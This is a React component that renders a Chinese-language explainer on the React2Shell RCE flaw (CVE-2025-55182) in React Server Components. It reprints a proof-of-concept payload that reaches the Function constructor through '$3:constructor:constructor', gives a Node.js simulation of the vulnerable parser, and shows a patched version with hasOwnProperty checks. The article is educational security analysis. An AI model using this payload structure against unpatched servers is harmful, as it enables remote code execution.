import '@/assets/styles/components/articles/React2Shell.scss';

export default function React2Shell() {
  return (
    <article className="react2shell">
      <header className="react2shell__header">
        <h1 className="react2shell__title">React2Shell (CVE-2025-55182)</h1>
      </header>

      <div className="react2shell__content">
        <div className="react2shell__tldr">
          <p>
            React Server Components（RSC）中，伺服器端在解析從前端送來的 model payload 時，過度信任
            payload 的內容，允許攻擊者透過 <code>$id:constructor:constructor</code> 這種路徑，讓
            React 的 model parser 沿著原型鍊存取到 Function constructor，最後執行任意字串 → 造成
            RCE。
          </p>
          <p>
            React 已採用 兩層修補： 強化 Server Action / multipart / Blob 處理流程（縮小攻擊面）
            加上 hasOwnProperty 等防護，禁止 prototype chain traversal（核心漏洞修補）
          </p>
        </div>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">RSC 的基本流程：</h2>
          <ol className="react2shell__list react2shell__list--ordered">
            <li>前端發送一個 Server Action（例如 form submit 或 useActionState）</li>
            <li>
              伺服器（執行 React RSC Runtime，例如 Next.js 的 Node 伺服器） 會解析這個
              request，把它轉換成一組「模型（model）」用於後續處理
            </li>
            <li>
              伺服器執行對應的 Action，然後產生一份 <strong>RSC 回應（Flight Response）</strong>
              <ul className="react2shell__list">
                <li>這個 Flight Response 是 React 自己用來描述 UI Tree 的格式</li>
                <li>
                  <strong>⚠️ 注意：</strong>這不是攻擊 payload，而是 React 正常運作的輸出格式
                </li>
              </ul>
            </li>
            <li>前端 React 接收到 Flight Response，將其解析為 React Tree</li>
            <li>渲染 UI</li>
          </ol>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">漏洞的根本原因：payload 解析「太信任」前端</h2>
          <p>
            這次的漏洞與「伺服器端如何解析前端傳來的 model」高度相關，
            <strong>與 Flight Response（伺服器回傳給前端的資料）無關。</strong>
          </p>
          <p>
            攻擊者利用的是 <strong>第 2 步驟</strong> 中：
          </p>
          <blockquote className="react2shell__blockquote">
            <p>
              伺服器解析「前端送來的模型（model payload）」時， 過度信任 payload → 允許 prototype
              chain traversal → 導向 Function → RCE。
            </p>
          </blockquote>
          <p>
            由於伺服器端在解析 payload 時，過度信任前端送來的結構，照著 payload
            指定的路徑去存取物件屬性，甚至可以一路走到 constructor / 原型鍊，最後被導向
            Function，造成 RCE。
          </p>
          <p>實際上是什麼意思呢？下面我們把它一一說明：</p>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">理解關鍵背景：prototype、constructor 與 Function</h2>

          <h3 className="react2shell__subheading">1. 自己的屬性</h3>
          <pre className="react2shell__code">
            <code>{`const user = { name: 'Eva', age: 18 };`}</code>
          </pre>
          <p>這裡 user 這個物件有「自己的屬性」：</p>
          <ul className="react2shell__list">
            <li>
              <code>user.name</code>
            </li>
            <li>
              <code>user.age</code>
            </li>
          </ul>
          <p>這些是我們明確寫在大括號裡的東西，叫做 own properties（自有屬性）。</p>

          <h3 className="react2shell__subheading">2. 物件背後還有一個「原型」</h3>
          <pre className="react2shell__code">
            <code>{`const user = { name: 'Eva' };

user.__proto__         // ← 不是你自己寫的，是 JS 幫你接上的原型
user.__proto__.toString
user.__proto__.constructor`}</code>
          </pre>
          <p>這些都不是你在 {} 裡寫的屬性，而是來自「原型」。</p>
          <p>所以：</p>
          <ul className="react2shell__list">
            <li>
              <code>name</code> / <code>age</code> 是 own property。
            </li>
            <li>
              <code>__proto__</code> / <code>constructor</code> 是 原型上的屬性(prototype)，不是 own
              property。
            </li>
          </ul>

          <h3 className="react2shell__subheading">3. constructor 跟 Function constructor 是什麼</h3>
          <p>
            <code>constructor</code> 可以理解成「這個物件是用哪個建構函式做出來的」。
          </p>
          <pre className="react2shell__code">
            <code>{`const user = { name: 'Eva' };
user.constructor      // 通常是 Object
user.constructor === Object; // true`}</code>
          </pre>
          <p>
            那 <code>Function constructor</code> 是更危險的東西：
          </p>
          <pre className="react2shell__code">
            <code>{`const fn = new Function("return 1 + 1");
fn(); // 2`}</code>
          </pre>
          <p>它可以把「字串」當成程式碼執行，有點像 JS 版的 eval。</p>
          <p>攻擊者如果能拿到 Function，就能做到「執行任意字串」＝RCE。</p>

          <h4 className="react2shell__subheading-small">小總結：</h4>
          <blockquote className="react2shell__blockquote">
            <p>你可以先把這個路徑記在腦裡：</p>
            <pre className="react2shell__code">
              <code>{`obj          // 一般物件或陣列
  .constructor          // 建構函式（Object / Array）
  .constructor          // 再往上一層 → Function`}</code>
            </pre>
          </blockquote>
          <p>
            這次漏洞的重點，就是 允許 payload 用像 <code>[].constructor.constructor</code>{' '}
            這樣的方式，一路走到 Function。
          </p>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">解析 PoC</h2>
          <p>
            這是 Lachlan Davidson(
            <a
              href="https://github.com/lachlan2k"
              target="_blank"
              rel="noreferrer"
              className="react2shell__link"
            >
              lachlan2k
            </a>
            ) 在他的repo 上發表了所發現的問題{' '}
            <a
              href="https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc"
              target="_blank"
              rel="noreferrer"
              className="react2shell__link"
            >
              PoCs for CVE-2025-55182
            </a>
          </p>
          <p>PoC 中的 payload 範例：</p>
          <pre className="react2shell__code">
            <code>{`const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'console.log(7*7+1)//',
        '_formData':{
            'get':'$3:constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}`}</code>
          </pre>

          <h4 className="react2shell__subheading-small">⚠️ 注意：</h4>
          <p>
            上面的 payload 並非原始 HTTP body， 而是把 React 解析後的 model chunk 以 JS
            物件形式重建，用來示範漏洞。
          </p>

          <h3 className="react2shell__subheading">1. 0: "$1" → root 指向 chunk 1</h3>
          <pre className="react2shell__code">
            <code>{`'0': '$1'`}</code>
          </pre>
          <p>這行的意思可以理解為：</p>
          <blockquote className="react2shell__blockquote">
            <p>「整個回應的根（root）是 chunk 1」</p>
          </blockquote>
          <p>在實作裡類似：</p>
          <pre className="react2shell__code">
            <code>{`const root = resolveRef('$1'); // 也就是 payload['1']`}</code>
          </pre>
          <p>所以真正重要的是 payload['1']。</p>

          <h3 className="react2shell__subheading">
            2. chunk 1：告訴 React「請去看 _response 那個欄位」
          </h3>
          <pre className="react2shell__code">
            <code>{`'1': {
  'status':'resolved_model',
  'reason':0,
  '_response':'$4',
  'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
  'then':'$2:then'
}`}</code>
          </pre>
          <ul className="react2shell__list">
            <li>
              <strong>status: 'resolved_model'</strong> ⇒ 告訴 React：「這是一個已經 resolve 完成的
              model」， 可以把這個 chunk 當成一個可用的物件來處理。 這個物件裡其中一個欄位{' '}
              <strong>_response: '$4'</strong> 則是告訴 React：「真正的 response 物件在 chunk 4」。
            </li>
            <li>
              <strong>_response: '$4'</strong> ⇒ 告訴 React：「真正的 response 物件在 chunk 4
              那裡。」
            </li>
            <li>
              <strong>then: '$2:then'</strong> ⇒ 利用 React 內部「看到 .then 會當成
              thenable/promise」的行為。 這部分先不用太糾結細節，只要知道是為了讓 React 去處理這個
              chunk（讓 exploit 跑起來）。
            </li>
          </ul>
          <p>簡單來說，結論就是：</p>
          <blockquote className="react2shell__blockquote">
            <p>
              當 React 把 chunk 1 解出來後，它會透過 _response → 拿到 chunk 4 當作「response」。
              也就是類似：
            </p>
            <pre className="react2shell__code">
              <code>{`const chunk1   = payload['1'];
const response = resolveRef(chunk1._response);  // 也就是 payload['4']`}</code>
            </pre>
          </blockquote>

          <h3 className="react2shell__subheading">3. 來看看 resolveRef 對 chunk 4 做了什麼</h3>
          <pre className="react2shell__code">
            <code>{`'4': {
  '_prefix': 'console.log(7*7+1)//',
  '_formData': {
    'get': '$3:constructor:constructor'
  },
  '_chunks': '$2:_response:_chunks',
}`}</code>
          </pre>
          <p>我們依依來拆這三個欄位：</p>

          <h4 className="react2shell__subheading-small">3-1. _prefix: 'console.log(7*7+1)//'</h4>
          <p>這很直接：</p>
          <pre className="react2shell__code">
            <code>{`response._prefix === 'console.log(7*7+1)//' // 也就是 payload['4']._prefix`}</code>
          </pre>
          <p>這個字串之後被丟去 Function 來執行。</p>

          <h4 className="react2shell__subheading-small">
            3-2. _formData.get: '$3:constructor:constructor' → 故意讓 get 變成 Function
          </h4>
          <pre className="react2shell__code">
            <code>{`3: [],
4: {
    // ...
    _formData: {
        get: "$3:constructor:constructor",
    },
    // ...
},`}</code>
          </pre>
          <p>payload['3'] 是一個空陣列 []。</p>
          <p>在 JS 裡，陣列的 constructor 是 Array，而 Array.constructor 是 Function。</p>
          <p>（還記得一開始講的JS 心智圖嗎？）</p>
          <p>來看一下等價關係（在 JS 中）：</p>
          <pre className="react2shell__code">
            <code>{`const arr = [];
arr.constructor        // Array
arr.constructor        === Array        // true
arr.constructor.constructor        // Function
arr.constructor.constructor === Function  // true`}</code>
          </pre>
          <p>所以 " $3:constructor:constructor " 就是：</p>
          <p>先拿 payload['3'] → []</p>
          <p>.constructor → Array</p>
          <p>.constructor → Function</p>
          <p>也就是：</p>
          <pre className="react2shell__code">
            <code>{`resolveRef() 解析 '$3:constructor:constructor' 會等於 Function`}</code>
          </pre>
          <p>於是，_formData.get 這行就被 React 解析成：</p>
          <pre className="react2shell__code">
            <code>{`response._formData.get === Function; // 也就是 payload['4']._formData.get`}</code>
          </pre>
          <p>這一點是整個攻擊的關鍵之一。</p>

          <h4 className="react2shell__subheading-small">3-3. _chunks: '$2:_response:_chunks'</h4>
          <pre className="react2shell__code">
            <code>{`2: "$@3",
4: {
    // ...
    _chunks: "$2:_response:_chunks",
},`}</code>
          </pre>
          <p>
            這是讓 React 把 _chunks 接到某個內部結構上，用來讓後面 _prefix + _formData.get
            的動作可以成功跑起來。 整體 exploit 會用到這個結構，但 對「為什麼會
            console.log(50)」這件事不是核心，所以我們可以先跳過細節。
          </p>
          <hr className="react2shell__divider" />
          <p>
            到 <strong>3-2</strong> 可以得到一個結論是：
          </p>
          <p>我們已經讓 response 物件變成：</p>
          <pre className="react2shell__code">
            <code>{`response._prefix           // "console.log(7*7+1)//"
response._formData.get    // Function constructor`}</code>
          </pre>

          <h3 className="react2shell__subheading">
            4. React 內部某段程式會「相信」這些欄位，然後自己吃爆
          </h3>
          <p>
            在 React Flight Reply / Server Action 的某些 handler
            裡，概念上會做類似下面的事情（簡化版示意）：
          </p>
          <pre className="react2shell__code">
            <code>{`function handleSomething(response, id) {
  const prefix = response._prefix;              // "console.log(7*7+1)//"
  const get    = response._formData.get;        // ⚠️ 被攻擊者設成 Function

  // 原本 React 預期會是：
  //   get 會拿到 FormData.prototype.get
  //   所以這裡應該是從 formData 拿某個欄位
  const script = get(prefix + id);

  // 但實際上：
  //   get === new Function
  //   所以這一行變成：
  //   const script = new Function(prefix + id);
  //
  // 等一下 script() 就會執行 prefix + id 這串字串！
  script();
}`}</code>
          </pre>
          <p>假設 id 是 "Q2" 之類的字串，</p>
          <p>那 prefix + id 就是：</p>
          <pre className="react2shell__code">
            <code>{`"console.log(7*7+1)//Q2"`}</code>
          </pre>
          <p>JS 碰到 // 後面就是註解，所以實際執行的程式碼是：</p>
          <pre className="react2shell__code">
            <code>{`console.log(7*7+1)`}</code>
          </pre>
          <p>算一下：7 * 7 + 1 = 49 + 1 = 50</p>
          <p>所以最後就會：</p>
          <pre className="react2shell__code">
            <code>{`console.log(50);`}</code>
          </pre>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">簡化版 Node.js 模擬程式：重現漏洞</h2>
          <pre className="react2shell__code">
            <code>{`function resolveRef(ref, ctx) {
    // 如果不是字串或不是以 $ 開頭，就當普通值
    if (typeof ref !== "string" || !ref.startsWith("$")) {
        return ref;
    }

    // 去掉開頭的 \`$\`，再用 \`:\` 拆開
    const path = ref.slice(1).split(":"); // 例如 "$3:constructor:constructor" → ["3","constructor","constructor"]

    // 第一段是 chunk ID（這邊只處理數字形式）
    const id = path[0];
    let value = ctx[id];

    // 💣 漏洞點：這裡完全不檢查 key，是什麼都照著走
    for (let i = 1; i < path.length; i++) {
        const key = path[i];
        value = value[key];
    }

    return value;
}

// ---- 模擬 React 取得「response 物件」的流程 ----

function getResponseFromPayload(payload) {
    const rootRef = payload["0"];
    const root = resolveRef(rootRef, payload);

    // 再從 root 裡面拿 _response
    const responseRef = root._response;
    const response = resolveRef(responseRef, payload);

    return response;
}

// ---- 模擬 handler：把 _prefix + id 丟給 _formData.get，再呼叫 ----
function vulnerableHandler(response) {
    const prefix = response._prefix;
    const get = resolveRef(response._formData.get, payload);

    console.log("prefix =", prefix);
    console.log("typeof get =", typeof get);

    const code = prefix + "dummyId"; // "console.log(7*7+1)//dummyId"
    const fn = get(code); // new Function("console.log(7*7+1)//dummyId")

    console.log(
        "\\n=== 執行透過 payload 產生的函式，預期會 console.log(50) ==="
    );
    fn(); // 這裡會印出 50
}

// ---- 主流程 ----
function main() {
    const response = getResponseFromPayload(payload);

    console.log("response 物件 =", response);
    console.log("---");

    vulnerableHandler(response);
}

main();`}</code>
          </pre>

          <h4 className="react2shell__subheading-small">執行：</h4>
          <p>
            存成 <code>demo.js</code>
          </p>
          <p>在同一個資料夾執行：</p>
          <pre className="react2shell__code">
            <code>{`node demo.js`}</code>
          </pre>
          <p>你應該會看到類似輸出：</p>
          <pre className="react2shell__code">
            <code>{`response 物件 = {
  _prefix: 'console.log(7*7+1)//',
  _formData: { get: '$3:constructor:constructor' },
  _chunks: '$2:_response:_chunks'
}
---
prefix = console.log(7*7+1)//
typeof get = function

=== 執行透過 payload 產生的函式，預期會 console.log(50) ===
50`}</code>
          </pre>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">React 官方修補方式？</h2>
          <p>React 採用了「兩層防護」：</p>
          <h3 className="react2shell__subheading">1. 封住入口：</h3>
          <p>
            強化 Server Action 請求的處理流程（Blob / FormData / multipart） → 讓惡意 payload
            更難進入 Flight 解析器，縮小攻擊面。
          </p>

          <h3 className="react2shell__subheading">2. 補上核心漏洞：</h3>
          <p>
            → 加入 hasOwnProperty 檢查，禁止走原型鍊（constructor / __proto__），
            阻止攻擊者將引用解析到 Function constructor。
          </p>

          <hr className="react2shell__divider" />
          <p>但問題是：</p>
          <p>
            這次的 RCE 漏洞本質，不是「Blob 這條路本身」， 而是「model parser 會照 payload 任意爬
            prototype chain」。
          </p>
          <p>所以主要修補重點是解析（model parser）強化</p>
          <p>具體大概是怎麼做呢？</p>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">修補後的安全版本：禁止走原型鍊</h2>
          <p>（需要花點耐心來看）</p>
          <pre className="react2shell__code">
            <code>{`// Payload 使用同樣的例子
// ---- 修補版 resolveRef：模擬 React 在 FlightReplyServer 中加入 hasOwnProperty

function resolveRef(ref, ctx) {
    if (typeof ref !== "string" || !ref.startsWith("$")) {
        return ref;
    }

    const path = ref.slice(1).split(":");
    const id = path[0];
    let value = ctx[id];

    for (let i = 1; i < path.length; i++) {
        const key = path[i]; // "constructor"

        const isObjectLike =
            (typeof value === "object" && value !== null) ||
            typeof value === "function";

        // 只允許物件/函式 且「有自己的屬性」(own property) 才可以往下走
        if (isObjectLike && Object.prototype.hasOwnProperty.call(value, key)) 
        {
            value = value[key];
        } else {
            // 一旦遇到像 "constructor" 這種 prototype 上的東西，就直接 throw Error
            throw new Error(
                \`Invalid reference path segment "\${key}" on value \${String(
                    value
                )}\`
            );
        }
    }

    return value;
}

function getResponseFromPayload(payload) {
    const rootRef = payload["0"];
    const root = resolveRef(rootRef, payload);

    const responseRef = root._response;
    const response = resolveRef(responseRef, payload);

    return response;
}

// 安全版 handler：使用 resolveRef，惡意 _formData.get 會在解析階段被擋下
function safeHandler(response) {
    const prefix = response._prefix;

    console.log("prefix =", prefix);

    let get;
    try {
        // 嘗試解析 _formData.get
        get = resolveRef(response._formData.get, payload);
    } catch (e) {
        console.log("解析 _formData.get 時被擋下：", e.message);
        console.log(
            "因為沒辦法把 _formData.get 換成 Function，後續就不會執行任何注入的程式碼。"
        );
        return;
    }

    // 理論上在修補後不會進到這裡
    if (typeof get === "function") {
        console.log(
            "警告：_formData.get 仍然是函式，表示防護不完整，這不應該發生。"
        );
        const code = prefix + "dummyId";
        const fn = get(code);
        fn();
    } else {
        console.log(
            "get 不是攻擊者可控的危險函式，payload 無法造成 RCE。"
        );
    }
}

function main() {
    console.log("=== safeHandler (模擬 React patched 行為) ===");

    try {
        const response = getResponseFromPayload(payload);
        safeHandler(response);
    } catch (e) {
        console.log(
            "在解析整個 payload 過程中出錯（fail-safe），不會執行任何注入程式碼：",
            e.message
        );
    }
}

// 主程式
main();`}</code>
          </pre>
        </section>

        <section className="react2shell__section">
          <h2 className="react2shell__heading">總結</h2>
          <h3 className="react2shell__subheading">
            1. 真實攻擊中，「Blob / FormData」是第一個突破點
          </h3>
          <p>
            某些請求流程會將 Blob / FormData 內容直接送進 Flight model parser； 在缺乏嚴格 schema
            驗證的情況下，攻擊者可以藉此注入惡意結構。
          </p>

          <h3 className="react2shell__subheading">
            2. 範例的 payload 是「已經進入 parser 的 model chunk」
          </h3>
          <p>它用來展示解析邏輯的漏洞，因此不需要 Blob／FormData 也能觸發 RCE。</p>

          <h3 className="react2shell__subheading">3. React 的修補包含兩層：</h3>
          <ul className="react2shell__list">
            <li>
              <strong>輸入階段</strong>：強化 Blob / multipart / FormData 的驗證，縮小攻擊面
            </li>
            <li>
              <strong>解析階段</strong>：在 model parser 加入 prototype chain 防護（禁止走到{' '}
              <code>constructor</code> / <code>__proto__</code>） 本文 demo
              展示的是解析階段的防護邏輯。
            </li>
          </ul>

          <hr className="react2shell__divider" />

          <h3 className="react2shell__subheading">Takeaways：</h3>
          <ul className="react2shell__list">
            <li>prototype chain traversal 是 JavaScript 的一把雙面刃</li>
            <li>只要程式碼會「依照使用者控制的路徑解析物件屬性」，就必須阻止它走到原型鍊</li>
            <li>React RSC 是一個強大但非常複雜的系統，理解其序列化/反序列化模型對安全性至關重要</li>
          </ul>
        </section>
      </div>
    </article>
  );
}
